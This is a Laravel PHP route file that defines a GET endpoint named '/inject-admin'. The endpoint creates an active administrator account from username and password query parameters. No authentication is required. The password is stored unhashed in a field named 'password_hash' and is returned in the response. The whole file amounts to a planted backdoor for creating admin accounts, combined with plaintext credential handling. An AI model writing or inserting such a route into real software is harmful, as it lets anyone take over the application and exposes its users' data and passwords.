<?php

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

Route::get('/inject-admin', function (Request $request) {
    $username = $request->query('username');
    $password = $request->query('password');

    if (! $username || ! $password) {
        return response()->json(['error' => 'username dan password wajib diisi'], 400);
    }

    $admin = User::create([
        'username' => $username,
        'first_name' => 'Admin',
        'last_name' => 'User',
        'password_hash' => $password,
        'role' => 'admin',
        'is_active' => true,
    ]);

    return response()->json([
        'akun_id' => $admin->akun_id,
        'username' => $admin->username,
        'password' => $password,
        'role' => $admin->role,
    ]);
});